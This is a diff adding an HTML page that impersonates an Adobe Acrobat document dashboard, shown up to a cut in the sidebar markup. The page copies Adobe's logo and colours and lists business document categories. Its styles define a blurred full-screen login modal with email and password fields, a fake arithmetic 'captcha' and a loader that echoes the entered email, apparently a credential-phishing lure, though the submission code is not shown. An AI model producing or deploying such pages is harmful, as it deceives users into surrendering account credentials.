@@ -1,0 +1,1429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Adobe Acrobat — Dashboard</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Crect width='36' height='36' rx='6' fill='%23FA0F00'/%3E%3Cpath d='M18 5 L31 30 H5 Z' fill='white'/%3E%3C/svg%3E"/>
+<link rel="alternate icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABQSURBVFhH7dAxAQAgDACx8G8bFpRnCPTuZpIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZLukB+3AAJiAAFBh40AAAAASUVORK5CYII="/>
+<style>
+/* ── TOKENS ── */
+:root {
+  --red:       #FA0F00;
+  --red-dk:    #C20000;
+  --blue:      #1473E6;
+  --blue-lt:   #EBF3FF;
+  --dark:      #1C1C1C;
+  --panel:     #F5F5F5;
+  --sidebar:   #2C2C2C;
+  --sidebar-h: #3A3A3A;
+  --border:    #E3E3E3;
+  --muted:     #767676;
+  --white:     #FFFFFF;
+  --success:   #12805C;
+  --warn:      #E68619;
+  --font: -apple-system, 'Segoe UI', Arial, sans-serif;
+  --r4: 4px; --r6: 6px; --r8: 8px;
+  --shadow: 0 2px 8px rgba(0,0,0,.10);
+  --shadow-h: 0 6px 24px rgba(0,0,0,.14);
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: var(--font); background: var(--panel); color: var(--dark); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+
+/* ── TOP BAR ── */
+.topbar {
+  height: 52px; background: var(--dark); display: flex; align-items: center;
+  padding: 0 16px; gap: 16px; flex-shrink: 0; border-bottom: 1px solid #111;
+  z-index: 200;
+}
+.topbar-logo { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+.topbar-logo svg { width: 28px; height: 20px; }
+.topbar-logo-label { color: #fff; font-size: 15px; font-weight: 700; letter-spacing: -0.3px; white-space: nowrap; }
+.topbar-logo-label span { color: var(--red); }
+
+.topbar-search {
+  flex: 1; max-width: 420px; margin-left: 16px;
+  display: flex; align-items: center;
+  background: rgba(255,255,255,.1); border: 1px solid rgba(255,255,255,.15);
+  border-radius: var(--r6); padding: 0 12px; gap: 8px; height: 32px;
+}
+.topbar-search input {
+  background: transparent; border: none; outline: none;
+  color: rgba(255,255,255,.85); font-size: 13px; width: 100%;
+}
+.topbar-search input::placeholder { color: rgba(255,255,255,.4); }
+.topbar-search svg { color: rgba(255,255,255,.4); flex-shrink: 0; }
+
+.topbar-right { margin-left: auto; display: flex; align-items: center; gap: 10px; }
+.tb-icon-btn {
+  width: 32px; height: 32px; border-radius: 50%; border: none; cursor: pointer;
+  background: rgba(255,255,255,.08); display: flex; align-items: center; justify-content: center;
+  transition: background .15s;
+}
+.tb-icon-btn:hover { background: rgba(255,255,255,.16); }
+.tb-icon-btn svg { width: 16px; height: 16px; }
+.avatar {
+  width: 32px; height: 32px; border-radius: 50%;
+  background: var(--red); color: #fff;
+  font-size: 12px; font-weight: 700;
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer; flex-shrink: 0; letter-spacing: 0.5px;
+}
+.notif-badge { position: relative; }
+.notif-badge::after {
+  content: '3'; position: absolute; top: -3px; right: -3px;
+  width: 14px; height: 14px; border-radius: 50%;
+  background: var(--red); color: #fff; font-size: 9px;
+  font-weight: 700; display: flex; align-items: center; justify-content: center;
+  line-height: 14px; text-align: center;
+}
+
+/* ── LAYOUT ── */
+.app-body { display: flex; flex: 1; overflow: hidden; }
+
+/* ── SIDEBAR ── */
+.sidebar {
+  width: 220px; background: var(--sidebar); color: rgba(255,255,255,.75);
+  display: flex; flex-direction: column; flex-shrink: 0;
+  border-right: 1px solid #222;
+}
+.sidebar-section { padding: 20px 0 8px; }
+.sidebar-label {
+  font-size: 10px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
+  color: rgba(255,255,255,.35); padding: 0 16px 8px;
+}
+.sb-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 8px 16px; font-size: 13px; cursor: pointer;
+  border-left: 2px solid transparent;
+  transition: background .15s, color .15s, border-color .15s;
+}
+.sb-item svg { width: 15px; height: 15px; flex-shrink: 0; opacity: .7; }
+.sb-item:hover { background: var(--sidebar-h); color: #fff; }
+.sb-item.active { background: rgba(250,15,0,.15); color: #fff; border-left-color: var(--red); }
+.sb-item.active svg { opacity: 1; }
+.sb-count {
+  margin-left: auto; background: rgba(255,255,255,.12);
+  border-radius: 10px; padding: 1px 7px;
+  font-size: 10px; font-weight: 700; color: rgba(255,255,255,.6);
+}
+.sb-divider { height: 1px; background: rgba(255,255,255,.08); margin: 8px 16px; }
+.sidebar-storage { margin-top: auto; padding: 16px; }
+.storage-label { font-size: 11px; color: rgba(255,255,255,.4); margin-bottom: 6px; }
+.storage-track { height: 4px; background: rgba(255,255,255,.1); border-radius: 2px; overflow: hidden; }
+.storage-fill { height: 100%; width: 63%; background: linear-gradient(90deg, var(--red), #FF6B35); border-radius: 2px; }
+.storage-info { font-size: 10px; color: rgba(255,255,255,.3); margin-top: 5px; }
+
+/* ── MAIN ── */
+.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+
+/* sub-toolbar */
+.subtoolbar {
+  height: 46px; background: var(--white); border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; padding: 0 20px; gap: 12px; flex-shrink: 0;
+}
+.subtoolbar-title { font-size: 14px; font-weight: 700; color: var(--dark); }
+.subtoolbar-tabs { display: flex; gap: 2px; margin-left: 8px; }
+.stab {
+  font-size: 12px; font-weight: 600; padding: 5px 12px; border-radius: var(--r4);
+  cursor: pointer; border: none; background: transparent; color: var(--muted);
+  transition: background .15s, color .15s;
+}
+.stab:hover { background: #F0F0F0; color: var(--dark); }
+.stab.active { background: var(--red); color: #fff; }
+.subtoolbar-right { margin-left: auto; display: flex; align-items: center; gap: 8px; }
+.sb-action-btn {
+  display: flex; align-items: center; gap: 6px;
+  font-size: 12px; font-weight: 600; padding: 6px 12px;
+  border-radius: var(--r4); border: 1px solid var(--border);
+  background: var(--white); cursor: pointer; color: var(--dark);
+  transition: background .15s, border-color .15s;
+}
+.sb-action-btn:hover { background: #F5F5F5; border-color: #ccc; }
+.sb-action-btn svg { width: 13px; height: 13px; }
+.sb-action-btn.primary { background: var(--blue); border-color: var(--blue); color: #fff; }
+.sb-action-btn.primary:hover { background: #0D66D0; }
+.view-toggle { display: flex; gap: 2px; }
+.vt-btn {
+  width: 28px; height: 28px; border: 1px solid var(--border); background: var(--white);
+  border-radius: var(--r4); cursor: pointer; display: flex; align-items: center; justify-content: center;
+  transition: background .15s;
+}
+.vt-btn:hover { background: #F5F5F5; }
+.vt-btn.active { background: var(--dark); border-color: var(--dark); }
+.vt-btn.active svg path, .vt-btn.active svg rect { fill: #fff; }
+.vt-btn svg { width: 13px; height: 13px; }
+
+/* content scroll */
+.main-content { flex: 1; overflow-y: auto; padding: 20px; }
+
+/* ── RECENT STRIP ── */
+.recent-strip { margin-bottom: 24px; }
+.section-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
+.section-head h3 { font-size: 13px; font-weight: 700; color: var(--dark); }
+.section-head a { font-size: 12px; color: var(--blue); text-decoration: none; }
+.section-head a:hover { text-decoration: underline; }
+
+.recent-cards { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 4px; }
+.recent-cards::-webkit-scrollbar { height: 4px; }
+.recent-cards::-webkit-scrollbar-thumb { background: #DDD; border-radius: 2px; }
+.recent-card {
+  flex-shrink: 0; width: 160px; background: var(--white);
+  border: 1px solid var(--border); border-radius: var(--r8);
+  overflow: hidden; cursor: pointer;
+  transition: box-shadow .2s, transform .2s;
+}
+.recent-card:hover { box-shadow: var(--shadow-h); transform: translateY(-2px); }
+.recent-thumb {
+  height: 100px; display: flex; align-items: center; justify-content: center;
+  position: relative; overflow: hidden;
+}
+.recent-thumb-page {
+  width: 76px; height: 88px; background: var(--white);
+  border: 1px solid #DDD; border-radius: 3px;
+  padding: 8px 7px; box-shadow: 2px 2px 6px rgba(0,0,0,.12);
+  display: flex; flex-direction: column; gap: 4px;
+}
+.tp-bar { height: 5px; border-radius: 2px; }
+.tp-line { height: 3px; background: #EEE; border-radius: 2px; }
+.tp-line.s { width: 60%; }
+.tp-line.xs { width: 40%; }
+.recent-card-info { padding: 8px 10px; border-top: 1px solid var(--border); background: var(--white); }
+.rc-name { font-size: 11px; font-weight: 700; color: var(--dark); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.rc-meta { font-size: 10px; color: var(--muted); margin-top: 2px; }
+
+/* ── DOC TABLE ── */
+.doc-table-wrap { background: var(--white); border: 1px solid var(--border); border-radius: var(--r8); overflow: hidden; }
+.doc-table { width: 100%; border-collapse: collapse; }
+.doc-table thead tr { background: #FAFAFA; border-bottom: 1px solid var(--border); }
+.doc-table th {
+  font-size: 11px; font-weight: 700; color: var(--muted);
+  text-transform: uppercase; letter-spacing: 0.8px;
+  padding: 10px 14px; text-align: left; white-space: nowrap;
+}
+.doc-table th.sortable { cursor: pointer; user-select: none; }
+.doc-table th.sortable:hover { color: var(--dark); }
+.sort-arrow { margin-left: 4px; color: var(--muted); }
+.doc-table tbody tr {
+  border-bottom: 1px solid #F3F3F3; cursor: pointer;
+  transition: background .12s;
+}
+.doc-table tbody tr:last-child { border-bottom: none; }
+.doc-table tbody tr:hover { background: #FAFBFF; }
+.doc-table tbody tr.selected { background: var(--blue-lt); }
+.doc-table td { padding: 11px 14px; font-size: 13px; color: var(--dark); vertical-align: middle; }
+
+/* file icon */
+.file-cell { display: flex; align-items: center; gap: 10px; }
+.file-icon {
+  width: 34px; height: 40px; border-radius: 3px; flex-shrink: 0;
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  font-size: 7px; font-weight: 900; letter-spacing: 0.5px;
+  position: relative; overflow: hidden;
+}
+.file-icon::before {
+  content: ''; position: absolute; top: 0; right: 0;
+  width: 10px; height: 10px; background: rgba(255,255,255,.3);
+}
+.fi-pdf { background: var(--red); color: rgba(255,255,255,.9); }
+.file-icon-label { font-size: 8px; font-weight: 900; letter-spacing: 1px; color: rgba(255,255,255,.9); margin-top: 2px; }
+.file-name { font-size: 13px; font-weight: 600; color: var(--dark); }
+.file-tag {
+  display: inline-block; margin-left: 6px; font-size: 10px; font-weight: 700;
+  padding: 1px 6px; border-radius: 3px;
+  vertical-align: middle;
+}
+.tag-hvac   { background: #FFF4EB; color: #C85000; }
+.tag-legal  { background: #F3EEFF; color: #7B4EE0; }
+.tag-health { background: #EDFAEF; color: #12805C; }
+.tag-proc   { background: #EBF3FF; color: #1473E6; }
+.tag-inv    { background: #FFECEB; color: var(--red); }
+.tag-struct { background: #FFF9EB; color: #7A5C00; }
+
+.file-size { font-size: 12px; color: var(--muted); }
+.file-date { font-size: 12px; color: var(--muted); white-space: nowrap; }
+.file-shared {
+  display: flex; align-items: center; gap: -4px;
+}
+.sharer {
+  width: 22px; height: 22px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 9px; font-weight: 700; color: #fff;
+  border: 1.5px solid var(--white);
+  margin-left: -4px;
+}
+.sharer:first-child { margin-left: 0; }
+
+/* status pill */
+.status-pill {
+  display: inline-flex; align-items: center; gap: 5px;
+  font-size: 11px; font-weight: 600; padding: 3px 8px; border-radius: 20px;
+}
+.sp-signed   { background: #EDFAEF; color: var(--success); }
+.sp-review   { background: #FFF4EB; color: var(--warn); }
+.sp-draft    { background: #F5F5F5; color: var(--muted); }
+.sp-pending  { background: var(--blue-lt); color: var(--blue); }
+.sp-approved { background: #EDFAEF; color: var(--success); }
+.sp-dot { width: 5px; height: 5px; border-radius: 50%; background: currentColor; }
+
+/* row actions */
+.row-actions {
+  display: flex; gap: 6px; opacity: 0;
+  transition: opacity .15s;
+}
+tr:hover .row-actions { opacity: 1; }
+.row-btn {
+  width: 26px; height: 26px; border-radius: var(--r4); border: 1px solid var(--border);
+  background: var(--white); cursor: pointer; display: flex; align-items: center; justify-content: center;
+  transition: background .12s, border-color .12s;
+}
+.row-btn:hover { background: #F5F5F5; border-color: #bbb; }
+.row-btn svg { width: 13px; height: 13px; }
+
+/* ── RIGHT PANEL (preview) ── */
+.right-panel {
+  width: 280px; background: var(--white); border-left: 1px solid var(--border);
+  display: flex; flex-direction: column; flex-shrink: 0; overflow-y: auto;
+}
+.rp-header {
+  padding: 16px 16px 12px; border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: space-between;
+}
+.rp-title { font-size: 13px; font-weight: 700; }
+.rp-close-btn {
+  width: 24px; height: 24px; border-radius: var(--r4);
+  background: transparent; border: none; cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  color: var(--muted);
+}
+.rp-close-btn:hover { background: #F0F0F0; }
+
+.rp-preview {
+  background: #3C3C3C; padding: 16px; display: flex; align-items: center; justify-content: center;
+  min-height: 180px;
+}
+.rp-page {
+  width: 140px; background: var(--white); border-radius: 3px;
+  padding: 16px 14px; box-shadow: 0 4px 20px rgba(0,0,0,.4);
+  display: flex; flex-direction: column; gap: 6px;
+}
+.rp-page-hdr { height: 6px; border-radius: 3px; }
+.rp-page-line { height: 4px; background: #EEE; border-radius: 2px; }
+.rp-page-line.s { width: 70%; }
+.rp-page-line.xs { width: 50%; }
+.rp-page-block {
+  height: 28px; background: #F5F5F5; border-radius: 3px; margin-top: 4px;
+  display: flex; align-items: center; justify-content: center;
+}
+.rp-page-block-text { font-size: 7px; color: #AAA; font-weight: 600; }
+
+.rp-meta { padding: 16px; }
+.rp-doc-name { font-size: 13px; font-weight: 700; margin-bottom: 4px; line-height: 1.3; }
+.rp-doc-tag { margin-bottom: 12px; }
+.rp-field { margin-bottom: 12px; }
+.rp-field-label { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: 3px; }
+.rp-field-value { font-size: 12px; color: var(--dark); }
+.rp-divider { height: 1px; background: var(--border); margin: 12px 0; }
+
+.rp-actions { display: flex; flex-direction: column; gap: 7px; padding: 0 16px 16px; }
+.rp-btn {
+  width: 100%; padding: 8px; border-radius: var(--r6); font-size: 12px; font-weight: 700;
+  cursor: pointer; border: none; text-align: center; display: flex; align-items: center; justify-content: center; gap: 6px;
+  transition: background .15s, transform .1s;
+}
+.rp-btn:active { transform: scale(.98); }
+.rp-btn svg { width: 13px; height: 13px; }
+.rp-btn-primary { background: var(--red); color: #fff; }
+.rp-btn-primary:hover { background: var(--red-dk); }
+.rp-btn-secondary { background: var(--blue-lt); color: var(--blue); }
+.rp-btn-secondary:hover { background: #D6EAFF; }
+.rp-btn-ghost { background: #F5F5F5; color: var(--dark); }
+.rp-btn-ghost:hover { background: #EBEBEB; }
+
+.rp-activity { padding: 0 16px 16px; }
+.rp-activity-title { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: 10px; }
+.activity-item { display: flex; gap: 8px; margin-bottom: 10px; align-items: flex-start; }
+.act-dot { width: 6px; height: 6px; border-radius: 50%; margin-top: 4px; flex-shrink: 0; }
+.act-text { font-size: 11px; color: var(--muted); line-height: 1.5; }
+.act-text strong { color: var(--dark); font-weight: 600; }
+
+/* ── TOAST ── */
+.toast {
+  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
+  background: var(--dark); color: #fff; padding: 10px 20px; border-radius: 6px;
+  font-size: 13px; font-weight: 500; box-shadow: var(--shadow-h);
+  display: flex; align-items: center; gap: 8px;
+  transition: transform .3s cubic-bezier(.34,1.56,.64,1), opacity .3s;
+  opacity: 0; z-index: 999; white-space: nowrap;
+}
+.toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+.toast svg { width: 14px; height: 14px; color: #2ECC71; }
+
+/* scrollbar */
+.main-content::-webkit-scrollbar { width: 6px; }
+.main-content::-webkit-scrollbar-track { background: transparent; }
+.main-content::-webkit-scrollbar-thumb { background: #DDD; border-radius: 3px; }
+
+.modal-overlay {
+  position: fixed; inset: 0; z-index: 9999;
+  background: rgba(0,0,0,.72);
+  backdrop-filter: blur(6px);
+  display: flex; align-items: center; justify-content: center;
+  padding: 16px;
+  overflow-y: auto;
+}
+.modal-card {
+  background: var(--white); border-radius: 10px;
+  width: 100%; max-width: 300px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0,0,0,.45);
+  flex-shrink: 0;
+  margin: auto;
+  animation: modalIn .3s cubic-bezier(.34,1.56,.64,1);
+}
+@keyframes modalIn {
+  from { opacity: 0; transform: translateY(16px) scale(.97); }
+  to   { opacity: 1; transform: translateY(0) scale(1); }
+}
+.modal-header {
+  background: var(--dark); padding: 12px 16px;
+  display: flex; align-items: center;
+}
+.modal-body { padding: 14px 16px 16px; }
+.modal-field { margin-bottom: 8px; }
+.modal-field label { display: block; font-size: 10px; font-weight: 700; color: var(--dark); margin-bottom: 3px; letter-spacing:.2px; }
+.modal-field input {
+  width: 100%; height: 30px; border: 1.5px solid var(--border); border-radius: 4px;
+  padding: 0 9px; font-size: 12px; color: var(--dark); outline: none;
+  transition: border-color .15s, box-shadow .15s; font-family: var(--font);
+}
+.modal-field input:focus { border-color: var(--blue); box-shadow: 0 0 0 2px rgba(20,115,230,.12); }
+.modal-field input::placeholder { color: #BBBBB; }
+.modal-forgot { display: block; text-align: right; font-size: 9px; color: var(--blue); text-decoration: none; margin-top: 2px; }
+.modal-forgot:hover { text-decoration: underline; }
+.modal-submit {
+  width: 100%; height: 32px; border: none; border-radius: 4px;
+  background: var(--red); color: #fff;
+  font-size: 12px; font-weight: 700; cursor: pointer; margin-top: 6px;
+  display: flex; align-items: center; justify-content: center; gap: 6px;
+  transition: background .15s, transform .1s; font-family: var(--font);
+}
+.modal-submit:hover { background: var(--red-dk); }
+.modal-submit:active { transform: scale(.98); }
+.modal-submit svg { width: 12px; height: 12px; }
+.modal-divider {
+  display: flex; align-items: center; gap: 7px; margin: 9px 0 8px;
+}
+.modal-divider::before, .modal-divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+.modal-divider span { font-size: 9px; color: var(--muted); }
+.modal-sso {
+  width: 100%; height: 30px; border: 1.5px solid var(--border); border-radius: 4px;
+  background: var(--white); color: var(--dark); font-size: 11px; font-weight: 600;
+  cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;
+  transition: background .15s; font-family: var(--font);
+}
+.modal-sso:hover { background: #F5F5F5; }
+.modal-footer-text {
+  text-align: center; font-size: 9px; color: var(--muted); margin-top: 10px; line-height: 1.5;
+}
+.modal-footer-text a { color: var(--blue); text-decoration: none; }
+.modal-footer-text a:hover { text-decoration: underline; }
+.modal-error {
+  background: #FFF0F0; border: 1px solid #FFCDD2; border-radius: 4px;
+  padding: 5px 8px; font-size: 10px; color: #C62828;
+  display: none; margin-bottom: 8px; align-items: center; gap: 6px;
+}
+.modal-error.show { display: flex; }
+.modal-error svg { width: 11px; height: 11px; flex-shrink: 0; }
+.modal-spinner { display: none; width: 11px; height: 11px; border: 2px solid rgba(255,255,255,.4); border-top-color: #fff; border-radius: 50%; animation: spin .6s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ── CAPTCHA ── */
+.captcha-step { display: none; }
+.captcha-step.active { display: block; }
+.captcha-box {
+  border: 1px solid var(--border); border-radius: 6px;
+  padding: 10px 12px; background: #FAFAFA; margin-bottom: 8px;
+}
+.captcha-box-top {
+  display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;
+}
+.captcha-box-label { font-size: 10px; font-weight: 700; color: var(--muted); letter-spacing: .5px; text-transform: uppercase; }
+.captcha-brand-tag { font-size: 8px; font-weight: 800; letter-spacing: .5px; color: var(--muted); }
+.captcha-brand-tag em { color: var(--red); font-style: normal; }
+.captcha-math-row {
+  display: flex; align-items: center; gap: 6px;
+}
+.captcha-equation {
+  display: flex; align-items: center; justify-content: center;
+  background: var(--dark); border-radius: 5px;
+  padding: 7px 10px; min-width: 80px; max-width: 90px;
+  font-size: 13px; font-weight: 700; color: #fff;
+  letter-spacing: 1px; font-family: 'Courier New', monospace;
+  user-select: none; flex-shrink: 0;
+  position: relative; overflow: hidden;
+}
+.captcha-equation::before {
+  content: ''; position: absolute; inset: 0;
+  background: repeating-linear-gradient(45deg, transparent, transparent 4px, rgba(255,255,255,.03) 4px, rgba(255,255,255,.03) 8px);
+}
+.captcha-eq-noise { position: relative; z-index: 1; }
+.captcha-answer-input {
+  width: 52px; flex-shrink: 0; height: 32px;
+  border: 1.5px solid var(--border); border-radius: 4px;
+  padding: 0 6px; font-size: 14px; font-weight: 700; color: var(--dark);
+  outline: none; text-align: center; font-family: var(--font);
+  transition: border-color .15s, box-shadow .15s;
+  -moz-appearance: textfield;
+}
+.captcha-answer-input::-webkit-outer-spin-button,
+.captcha-answer-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+.captcha-answer-input:focus { border-color: var(--blue); box-shadow: 0 0 0 2px rgba(20,115,230,.12); }
+.captcha-answer-input.correct { border-color: #27AE60; background: #EDFAEF; }
+.captcha-answer-input.wrong   { border-color: #C62828; background: #FFF0F0; }
+.captcha-refresh-btn {
+  background: none; border: none; cursor: pointer; padding: 4px;
+  color: var(--muted); display: flex; align-items: center;
+  border-radius: 3px; transition: color .15s, background .15s; flex-shrink: 0; margin-left: auto;
+}
+.captcha-refresh-btn:hover { color: var(--dark); background: #EBEBEB; }
+.captcha-refresh-btn svg { width: 12px; height: 12px; }
+.captcha-hint { font-size: 9px; color: var(--muted); margin-top: 5px; }
+.captcha-error-msg {
+  font-size: 10px; color: #C62828; margin-bottom: 6px; display: none;
+  padding: 4px 8px; background: #FFF0F0; border: 1px solid #FFCDD2; border-radius: 3px;
+}
+.captcha-error-msg.show { display: block; }
+.captcha-verify-btn {
+  width: 100%; height: 30px; border: none; border-radius: 4px;
+  background: var(--blue); color: #fff;
+  font-size: 11px; font-weight: 700; cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 5px;
+  transition: background .15s; font-family: var(--font); margin-top: 8px;
+}
+.captcha-verify-btn:hover { background: #0D66D0; }
+.captcha-verify-btn svg { width: 11px; height: 11px; }
+
+/* ── DASHBOARD LOADER ── */
+.dash-loader {
+  display: none;
+  position: fixed; inset: 0; z-index: 8888;
+  background: var(--panel);
+  flex-direction: column; align-items: center; justify-content: center;
+  gap: 20px;
+}
+.dash-loader-logo { display: flex; align-items: center; gap: 10px; opacity: .9; }
+.dash-loader-logo span { font-size: 16px; font-weight: 700; color: var(--dark); }
+.dash-loader-logo span em { color: var(--red); font-style: normal; }
+.dash-loader-msg { font-size: 13px; color: var(--muted); letter-spacing: .2px; }
+.dash-loader-email { font-size: 11px; color: var(--blue); margin-top: -12px; }
+.dash-loader-track {
+  width: 220px; height: 3px; background: var(--border); border-radius: 2px; overflow: hidden;
+}
+.dash-loader-bar {
+  height: 100%; width: 0%; background: var(--red);
+  border-radius: 2px; transition: width .35s ease;
+}
+.dash-loader-dots { display: flex; gap: 6px; margin-top: 4px; }
+.dash-loader-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--border);
+  animation: dotPulse 1.2s ease-in-out infinite;
+}
+.dash-loader-dot:nth-child(2) { animation-delay: .2s; }
+.dash-loader-dot:nth-child(3) { animation-delay: .4s; }
+@keyframes dotPulse {
+  0%, 80%, 100% { background: var(--border); transform: scale(1); }
+  40% { background: var(--red); transform: scale(1.3); }
+}
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <div class="topbar-logo">
+    <svg viewBox="0 0 45 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <!-- Left triangle: apex top-left, base bottom-right -->
+      <path d="M0 32 L18 0 L36 32 Z" fill="#FA0F00"/>
+      <!-- Right triangle offset, slightly overlapping, darker -->
+      <path d="M14 32 L32 0 L45 32 Z" fill="#FA0F00" opacity="0.55"/>
+    </svg>
+    <span class="topbar-logo-label"><span>Adobe</span> Acrobat</span>
+  </div>
+  <div class="topbar-search">
+    <svg width="13" height="13" fill="none" viewBox="0 0 16 16"><circle cx="7" cy="7" r="5" stroke="rgba(255,255,255,.4)" stroke-width="1.5"/><line x1="11" y1="11" x2="14.5" y2="14.5" stroke="rgba(255,255,255,.4)" stroke-width="1.5" stroke-linecap="round"/></svg>
+    <input type="text" placeholder="Search documents…" value=""/>
+  </div>
+  <div class="topbar-right">
+    <button class="tb-icon-btn notif-badge" title="Notifications">
+      <svg width="16" height="16" fill="none" viewBox="0 0 16 16"><path d="M8 2a4 4 0 0 1 4 4v3l1.5 2H2.5L4 9V6a4 4 0 0 1 4-4Z" stroke="rgba(255,255,255,.7)" stroke-width="1.3"/><path d="M6.5 13.5a1.5 1.5 0 0 0 3 0" stroke="rgba(255,255,255,.7)" stroke-width="1.3"/></svg>
+    </button>
+    <button class="tb-icon-btn" title="Help">
+      <svg width="16" height="16" fill="none" viewBox="0 0 16 16"><circle cx="8" cy="8" r="5.5" stroke="rgba(255,255,255,.7)" stroke-width="1.3"/><path d="M6 6.5c0-1.1.9-2 2-2s2 .9 2 2c0 .8-.5 1.5-1.2 1.8L8 8.8v1" stroke="rgba(255,255,255,.7)" stroke-width="1.3" stroke-linecap="round"/><circle cx="8" cy="11.2" r=".6" fill="rgba(255,255,255,.7)"/></svg>
+    </button>
+    <div class="avatar" title="My Account">ME</div>
+  </div>
+</div>
+
+<div class="app-body">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Workspace</div>
+      <div class="sb-item active" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><rect x="2" y="2" width="5" height="5" rx="1" fill="currentColor"/><rect x="9" y="2" width="5" height="5" rx="1" fill="currentColor" opacity=".5"/><rect x="2" y="9" width="5" height="5" rx="1" fill="currentColor" opacity=".5"/><rect x="9" y="9" width="5" height="5" rx="1" fill="currentColor" opacity=".3"/></svg>
+        All Documents <span class="sb-count">24</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="5.5" stroke="currentColor" stroke-width="1.3"/><path d="M5.5 8l2 2 3-3" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Awaiting Signature <span class="sb-count">3</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><path d="M3 3h10v10H3z" stroke="currentColor" stroke-width="1.3" rx="1"/><path d="M5 6h6M5 8.5h4" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
+        Drafts <span class="sb-count">5</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><path d="M8 2v8M5 7l3 3 3-3" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 12h10" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>
+        Shared with Me <span class="sb-count">7</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><path d="M8 2l1.6 3.3 3.6.5-2.6 2.5.6 3.6L8 10.3l-3.2 1.6.6-3.6L2.8 5.8l3.6-.5L8 2z" stroke="currentColor" stroke-width="1.3" stroke-linejoin="round"/></svg>
+        Starred
+      </div>
+    </div>
+    <div class="sb-divider"></div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Categories</div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><rect x="2" y="2" width="12" height="12" rx="2" stroke="#C85000" stroke-width="1.3"/><path d="M5 6h6M5 9h4" stroke="#C85000" stroke-width="1.3" stroke-linecap="round"/></svg>
+        <span style="color:#C85000">HVAC / MEP</span> <span class="sb-count">8</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><rect x="2" y="2" width="12" height="12" rx="2" stroke="#7B4EE0" stroke-width="1.3"/><path d="M5 6h6M5 9h4" stroke="#7B4EE0" stroke-width="1.3" stroke-linecap="round"/></svg>
+        <span style="color:#7B4EE0">Legal</span> <span class="sb-count">4</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><rect x="2" y="2" width="12" height="12" rx="2" stroke="#12805C" stroke-width="1.3"/><path d="M5 6h6M5 9h4" stroke="#12805C" stroke-width="1.3" stroke-linecap="round"/></svg>
+        <span style="color:#12805C">Health &amp; Safety</span> <span class="sb-count">3</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><rect x="2" y="2" width="12" height="12" rx="2" stroke="#1473E6" stroke-width="1.3"/><path d="M5 6h6M5 9h4" stroke="#1473E6" stroke-width="1.3" stroke-linecap="round"/></svg>
+        <span style="color:#1473E6">Procurement</span> <span class="sb-count">5</span>
+      </div>
+      <div class="sb-item" onclick="setNav(this)">
+        <svg viewBox="0 0 16 16" fill="none"><rect x="2" y="2" width="12" height="12" rx="2" stroke="#FA0F00" stroke-width="1.3"/><path d="M5 6h6M5 9h4" stroke="#FA0F00" stroke-width="1.3" stroke-linecap="round"/></svg>
